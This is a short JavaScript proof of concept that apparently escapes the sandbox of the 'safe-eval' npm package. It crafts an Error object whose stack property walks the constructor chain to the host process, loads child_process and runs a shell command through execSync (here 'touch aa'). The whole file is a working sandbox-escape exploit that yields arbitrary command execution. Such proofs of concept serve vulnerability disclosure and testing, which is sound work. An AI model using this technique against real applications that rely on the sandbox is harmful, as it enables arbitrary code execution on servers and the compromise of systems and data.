const safeEval = require("safe-eval");

const theFunction = function () {
  const bad = new Error();
  bad.proto = null;
  bad.stack = {
    match(outer) {
      throw outer.constructor
        .constructor("return process")()
        .mainModule.require("child_process")
        .execSync("touch aa")
        .toString();
    },
  };
  return bad;
};

const untrusted = `(${theFunction})()`;
console.log(safeEval(untrusted));

//console.log({}.polluted)
